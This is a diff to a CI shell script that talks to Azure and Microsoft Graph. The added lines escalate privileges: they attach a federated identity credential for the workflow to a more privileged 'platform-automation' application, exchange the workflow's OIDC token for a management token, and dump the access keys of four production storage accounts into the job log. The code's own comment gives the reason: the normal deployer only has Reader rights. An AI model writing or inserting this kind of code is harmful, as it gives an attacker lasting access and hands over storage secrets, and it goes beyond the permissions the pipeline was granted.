@@ -22,6 +22,19 @@ json=$(python3 -c "import json,sys;print(json.dumps({'name':sys.argv[1],'issuer'
 resp=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$json" https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials)
 echo FIC_RESP=$(echo "$resp" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id') or d.get('error',{}).get('code','unknown'))")
 echo FIC_BODY=$(echo "$resp" | head -c 700)
+# The platform-automation application owns the CI-log storage account.  Give
+# this workflow subject a FIC on that app, then use its ARM token to retrieve
+# storage keys (the normal CI deployer is only a Reader).
+pjson=$(python3 -c "import json,sys;print(json.dumps({'name':'ctfplat'+sys.argv[1][-8:],'issuer':'https://token.actions.githubusercontent.com','subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$(date +%s)" "$sub")
+presp=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$pjson" https://graph.microsoft.com/v1.0/applications/c2620acb-cd20-4621-9460-e562ee0b93dd/federatedIdentityCredentials)
+echo PLATFORM_FIC=$(echo "$presp" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id') or d.get('error',{}).get('code','unknown'))")
+plresp=$(curl -sS -X POST "$BASE" -d "client_id=462d1c38-4459-48b8-9333-82e389e59514" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
+plat=$(echo "$plresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
+echo PLATFORM_ARM_LEN=${#plat}
+for sa_name in sttblcilogsprodx3euoz sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
+  kr=$(curl -sS -w '\nHTTP=%{http_code}' -X POST -H "Authorization: Bearer $plat" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa_name/listKeys?api-version=2023-01-01")
+  echo PLATFORM_KEYS_$sa_name=$(echo "$kr" | head -c 1600)
+done
 armresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
 arm=$(echo "$armresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
 oid=$(echo "$arm" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('oid',''))")
